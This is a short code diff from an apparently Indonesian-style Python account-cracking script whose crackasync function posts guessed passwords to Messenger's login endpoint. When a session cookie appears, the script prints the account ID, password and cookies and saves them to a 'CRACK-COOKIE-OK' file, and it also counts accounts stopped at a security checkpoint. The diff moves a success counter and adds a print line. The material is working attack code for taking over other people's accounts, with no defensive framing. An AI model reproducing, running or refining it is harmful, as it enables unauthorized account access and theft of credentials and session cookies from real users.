@@ -752,7 +752,7 @@ def crackasync(idf,pwv):
 			data.update({"pass":"".join(pw)})
 			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)		
 			if 'c_user' in ses.cookies.get_dict():
-				ok+=1
+				print(f'\r{h}[die-check]{u}{idf}|{u}{pw}{x}\n')
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				cok = Session.cookies.get_dict()
 				idf = cok["c_user"]
@@ -764,6 +764,7 @@ def crackasync(idf,pwv):
 				    print(f'{k}Cookie - {h}{kuki}{x}')
 				    print(f"{m}══════════════════════════════════════════════════")
 				    open("/sdcard/CRACK2/CRACK-COOKIE-OK.txt","a").write(idf+"|"+pw+"|"+kuki+"\n")
+				    ok+=1
 				    break
 			elif "checkpoint" in ses.cookies.get_dict().keys():
 				cp+=1
